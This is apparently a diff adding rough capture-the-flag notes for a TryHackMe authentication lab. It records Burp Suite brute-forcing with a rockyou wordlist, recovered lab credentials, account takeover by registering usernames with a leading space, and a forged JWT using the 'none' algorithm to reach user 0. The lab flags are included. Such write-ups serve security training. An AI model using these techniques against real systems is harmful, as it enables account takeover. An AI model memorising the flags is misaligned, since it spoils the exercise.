@@ -1,0 +1,48 @@
+burp suite
+sniper
+attack type: sniper
+copy part rockyou
+start attack ---> 530
+jack:12345678
+fad9ddc1feebd9e9bca05f02dd89e271
+
+mike:12345
+e1faaa144df2f24aa0a9284f4a5bb578
+
+register account "darren" ---> exist
+register account " darren" ---> log in with this account --->wow
+fe86079416a21a3c99937fea8874b667
+
+the same
+register account "arthur" ---> exist
+register account " arthur" ---> log in with this account  --> wwow
+d9ac0f7db4fda460ac3edeb75d75e16e
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.
+eyJleHAiOjE2NDExMzc2NjcsImlhdCI6MTY0MTEzNzM2NywibmJmIjoxNjQxMTM3MzY3LCJpZGVudGl0eSI6MX0.
+
+HTNzbk4EIvpQoezL66BF1Tm6E8A5VRNMCKQG81rtjb4
+
+echo 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9'|base64 -d
+{"typ":"JWT","alg":"HS256"}
+
+echo 'eyJleHAiOjE2NDExMzc2NjcsImlhdCI6MTY0MTEzNzM2NywibmJmIjoxNjQxMTM3MzY3LCJpZGVudGl0eSI6MX0.' | base64 -d
+{"exp":1641137667,"iat":1641137367,"nbf":1641137367,"identity":1}
+
+
+change authorization 
+eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0K.eyJleHAiOjE1ODY3MDUyOTUsImlhdCI6MTU4NjcwNDk5NSwibmJmIjoxNTg2NzA0OTk1LCJpZGVudGl0eSI6MH0K.
+
+92498880383088033228
+
+create user
+change 1 to 0
+http://10.10.196.111:7777/users/0?
+
+Your password:
+abcd1234
+
+Your secret data:
+Here's your flag: 72102933396288983011
+
+https://tryhackme.com/room/authenticate
